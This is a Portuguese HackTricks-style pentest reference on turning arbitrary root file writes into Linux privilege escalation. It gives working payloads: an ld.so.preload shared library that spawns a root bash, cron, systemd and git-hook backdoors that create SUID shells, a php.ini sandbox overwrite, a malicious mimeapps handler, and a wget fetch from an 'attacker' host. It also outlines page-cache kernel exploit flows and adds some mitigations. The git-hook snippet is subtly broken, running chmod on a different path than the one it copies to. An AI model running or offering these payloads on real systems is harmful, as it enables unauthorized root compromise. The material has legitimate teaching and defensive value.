# Escrita Arbitrária de Arquivo como Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Este arquivo se comporta como a variável de ambiente **`LD_PRELOAD`**, mas também funciona em **binários SUID**.\
Se você puder criá-lo ou modificá-lo, basta adicionar um **caminho para uma biblioteca que será carregada** com cada binário executado.

Por exemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) são **scripts** que são **executados** em vários **eventos** em um repositório git, como quando um commit é criado, um merge... Portanto, se um **script ou usuário privilegiado** estiver realizando essas ações com frequência e for possível **escrever na pasta `.git`**, isso pode ser usado para **privesc**.

Por exemplo, é possível **gerar um script** em um repositório git dentro de **`.git/hooks`** para que ele seja sempre executado quando um novo commit for criado:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Arquivos de Cron e de temporização

Se você puder **escrever em arquivos relacionados ao cron que o root executa**, normalmente poderá obter execução de código na próxima vez que o job for executado. Alvos interessantes incluem:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- O próprio crontab do root em `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Timers do `systemd` e os serviços que eles acionam

Verificações rápidas:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Caminhos típicos de abuso:

- **Adicionar um novo cron job de root** a `/etc/crontab` ou a um arquivo em `/etc/cron.d/`
- **Substituir um script** já executado por `run-parts`
- **Criar um backdoor em um destino de timer existente** modificando o script ou binário que ele inicia

Exemplo mínimo de payload do cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se você só puder escrever dentro de um diretório do cron usado por `run-parts`, coloque nele um arquivo executável:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` geralmente ignora nomes de arquivo que contêm pontos, portanto prefira nomes como `backup` em vez de `backup.sh`.
- Algumas distros usam `anacron` ou timers do `systemd` em vez do cron clássico, mas a ideia de abuse é a mesma: **modificar o que o root executará posteriormente**.

### Arquivos de Service e Socket

Se você puder escrever em **arquivos de unidade do `systemd`** ou nos arquivos referenciados por eles, poderá obter execução de código como root recarregando e reiniciando a unidade, ou aguardando o acionamento do caminho de ativação do service/socket.

Os alvos interessantes incluem:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Overrides drop-in em `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binários do service referenciados por `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Caminhos `EnvironmentFile=` graváveis carregados por um service root

Verificações rápidas:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Caminhos comuns de abuso:

- **Sobrescrever `ExecStart=`** em uma unit de serviço pertencente ao root que você pode modificar
- **Adicionar um drop-in override** com um `ExecStart=` malicioso e limpar o antigo primeiro
- **Inserir um backdoor no script/binário** já referenciado pela unit
- **Sequestrar um serviço ativado por socket** modificando o arquivo `.service` correspondente, que é iniciado quando o socket recebe uma conexão

Exemplo de override malicioso:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Fluxo típico de ativação:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Se você não puder reiniciar os services por conta própria, mas puder editar uma unit ativada por socket, talvez só precise **aguardar uma conexão de cliente** para disparar a execução do service com backdoor como root.

### Sobrescreva um `php.ini` restritivo usado por um sandbox PHP privilegiado

Alguns daemons personalizados validam PHP fornecido pelo usuário executando `php` com um **`php.ini` restritivo** (por exemplo, `disable_functions=exec,system,...`). Se o código em sandbox ainda tiver **qualquer primitive de escrita** (como `file_put_contents`) e você conseguir alcançar o **caminho exato do `php.ini`** usado pelo daemon, poderá **sobrescrever essa configuração** para remover as restrições e, em seguida, enviar um segundo payload que será executado com privilégios elevados.<sup>[[2]](#references)</sup>

Fluxo típico:

1. O primeiro payload sobrescreve a configuração do sandbox.
2. O segundo payload executa o código agora que as funções perigosas foram reabilitadas.

Exemplo mínimo (substitua pelo caminho usado pelo daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se o daemon for executado como root (ou validar usando paths pertencentes ao root), a segunda execução resultará em um contexto root. Isso é essencialmente uma **escalada de privilégios via sobrescrita de configuração** quando o runtime em sandbox ainda pode gravar arquivos.

### binfmt_misc

O arquivo localizado em `/proc/sys/fs/binfmt_misc` indica qual binário deve executar quais tipos de arquivos. TODO: verificar os requisitos para abusar disso e executar uma rev shell quando um tipo de arquivo comum for aberto.

### Sobrescrever manipuladores de esquema (como http: ou https:)

Um atacante com permissões de gravação nos diretórios de configuração de uma vítima pode facilmente substituir ou criar arquivos que alteram o comportamento do sistema, resultando na execução não intencional de código. Ao modificar o arquivo `$HOME/.config/mimeapps.list` para apontar os manipuladores de URL HTTP e HTTPS para um arquivo malicioso (por exemplo, definindo `x-scheme-handler/http=evil.desktop`), o atacante garante que **clicar em qualquer link http ou https execute o código especificado nesse arquivo `evil.desktop`**. Por exemplo, após inserir o código malicioso a seguir em `evil.desktop`, dentro de `$HOME/.local/share/applications`, qualquer clique em uma URL externa executará o comando incorporado:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Para mais informações, confira [**esta publicação**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), onde isso foi usado para explorar uma vulnerabilidade real.

### Root executando scripts/binários graváveis pelo usuário

Se um fluxo privilegiado executar algo como `/bin/sh /home/username/.../script` (ou qualquer binário dentro de um diretório pertencente a um usuário não privilegiado), você pode sequestrá-lo:<sup>[[1]](#references)</sup>

- **Detecte a execução:** monitore os processos com [pspy](https://github.com/DominicBreuker/pspy) para identificar o root invocando caminhos controlados pelo usuário:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirme a capacidade de escrita:** certifique-se de que tanto o arquivo-alvo quanto o diretório pertencem ao seu usuário ou podem ser escritos por ele.
- **Sequestre o alvo:** faça backup do binário/script original e coloque um payload que crie um shell SUID (ou qualquer outra ação como root); depois, restaure as permissões:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Acione a ação privilegiada** (por exemplo, pressionando um botão da UI que inicia o helper). Quando o root executar novamente o path hijacked, obtenha o shell escalado com `./rootshell -p`.

### Modificação somente do arquivo no page cache de binários privilegiados

Alguns bugs do kernel não modificam o arquivo **no disco**. Em vez disso, permitem modificar somente a **cópia no page cache de um arquivo legível**. Se você puder atingir um binário **setuid** ou executado de outra forma pelo **root**, a próxima execução poderá executar bytes controlados pelo attacker a partir da memória e escalar privilégios, mesmo que o hash do arquivo no disco permaneça inalterado.

É útil pensar nisso como uma **primitive de escrita de arquivo somente em runtime**:

- **O disco permanece limpo**: o inode e os bytes no disco não são alterados
- **A memória fica suja**: processos que leem/executam a página em cache obtêm o conteúdo modificado pelo attacker
- **O efeito é temporário**: a alteração desaparece após reboot ou eviction do cache

Essa primitive fica entre o **arbitrary file write** clássico e bugs mais antigos de **abuso do page cache**, como Dirty COW / Dirty Pipe:

- Dirty COW dependia de uma race
- Dirty Pipe tinha restrições na posição de escrita
- Uma primitive somente de page cache pode ser mais confiável se o vulnerable path fornecer writes diretos em páginas file-backed em cache

#### Fluxo genérico de privesc

1. Obtenha uma primitive do kernel capaz de escrever em **páginas file-backed do page cache**
2. Use-a contra um **binário privilegiado legível** ou outro arquivo executado pelo root
3. Acione a execução **antes** que a página seja evicted do cache
4. Obtenha code execution como root enquanto o arquivo no disco ainda parece não modificado

Alvos típicos de alto valor:

- Binários **setuid-root**
- Helpers iniciados por **serviços root**
- Binários comumente executados a partir de **containers que compartilham o kernel/page cache do host**

#### Caminho de exemplo com AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) é um bom exemplo dessa classe. O vulnerable path estava na userspace API de crypto do Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` pode mover referências para páginas do page cache de um arquivo legível para o scatterlist TX de crypto
- o decrypt path in-place de `algif_aead` reutilizava os buffers de origem e destino
- `authencesn` então escrevia na região de tag do destino
- quando essa região ainda referenciava páginas file-backed obtidas via splice, a escrita atingia o **page cache do arquivo-alvo**

Portanto, a técnica interessante não é o CVE em si, mas o pattern:

- **fornecer páginas de cache file-backed a um subsistema do kernel**
- fazer o subsistema **tratá-las como output gravável**
- acionar um pequeno overwrite controlado na memória

O PoC público usava **writes repetidos de 4 bytes** para modificar `/usr/bin/su` na memória e então executá-lo.

#### Caminho de exemplo com ESP / XFRM + clone TEE do netfilter

DirtyClone (CVE-2026-43503) mostra outra variante do mesmo pattern de **page-cache-only write-to-root**, mas desta vez o sink é o **decrypt do IPsec ESP**, em vez de `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

A técnica importante é a etapa de **metadata-laundering**:

- `splice()` coloca uma **página read-only file-backed do page cache** em um pacote ESP-in-UDP
- a mitigação original do DirtyFrag marcava esse skb com `SKBFL_SHARED_FRAG`, para que `esp_input()` fizesse um **copy antes do decrypt**
- o netfilter `TEE` duplica o pacote por meio de `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- o clone mantém a **mesma referência física à página do page cache**, mas perde `SKBFL_SHARED_FRAG`
- `esp_input()` então trata o clone como seguro e executa o **decrypt in-place de `cbc(aes)`** sobre a página file-backed

Portanto, a lição para o reviewer é mais ampla que o CVE: se uma mitigação depende de **metadata de skb/página** para decidir se uma operação precisa fazer copy primeiro, qualquer **path de clone/copy que preserve a página de backing, mas descarte os metadados**, pode reabrir silenciosamente a primitive de escrita.

Fluxo típico de exploitation:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` para obter **`CAP_NET_ADMIN` dentro de um network namespace privado**
2. ativar o loopback e instalar uma **rule `TEE` do netfilter** em `mangle/OUTPUT`
3. instalar SAs de transporte XFRM ESP via `NETLINK_XFRM`
4. codificar cada word de 4 bytes alvo no campo `seq_hi` da SA (o word-selection trick do DirtyFrag)
5. enviar o pacote ESP-in-UDP obtido via splice para que o **clone TEE** alcance `esp_input()` e faça o decrypt **in-place**
6. repetir até que a cópia do `/usr/bin/su` no page cache ou de outro executável privilegiado contenha code controlado pelo attacker

Operacionalmente, o impacto é igual ao do exemplo com `AF_ALG`: o arquivo no disco permanece limpo, mas `execve()` consome os **bytes modificados do page cache** e fornece root.

Verificações úteis de exposure para essa variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
A redução de curto prazo da superfície de ataque também é específica ao caminho neste caso: atualizar para um kernel que contenha `48f6a5356a33` corrige o caminho de clone, enquanto bloquear o autoload de `xt_TEE` remove a **etapa de lavagem de flags** e bloquear `esp4` / `esp6` remove o **sink de descriptografia**.

#### Exposição e hunting

Se você suspeitar dessa classe de bug, não dependa apenas de verificações de integridade do disco. Verifique também:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` pode ser carregável/descarregável como um módulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: a interface é integrada ao kernel
- binários setuid são bons alvos porque um patch apenas no page cache pode ser suficiente para transformar um foothold local em root

#### Redução da superfície de ataque para o caminho `algif_aead`

Se a interface vulnerável for fornecida por um módulo carregável:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Se estiver compilado no kernel, algumas divulgações relataram o bloqueio do caminho init com:
```bash
initcall_blacklist=algif_aead_init
```
Esse tipo de mitigação também vale a pena ser lembrado para outros kernel LPEs: se a exploração depender de uma interface opcional específica, desabilitar ou colocar essa interface na blacklist pode interromper o caminho do exploit mesmo antes de uma atualização completa do kernel estar disponível.

## Referências

- [1] [HTB Bamboo – hijacking de um script executado como root em um diretório do PaperCut gravável pelo usuário](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ do Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgação do CVE-2026-31431 no oss-security da Openwall](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correção do Linux stable: crypto: algif_aead - Reverter para operar out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory do CVE-2026-31431](https://copy.fail/)
- [7] [Theori / Xint writeup técnico](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repositório / README do DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Analisando e explorando a variante de Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Correção do Linux: net: skb: preservar `SKBFL_SHARED_FRAG` em `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigação anterior do Linux: definir `SKBFL_SHARED_FRAG` para pacotes UDP com splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
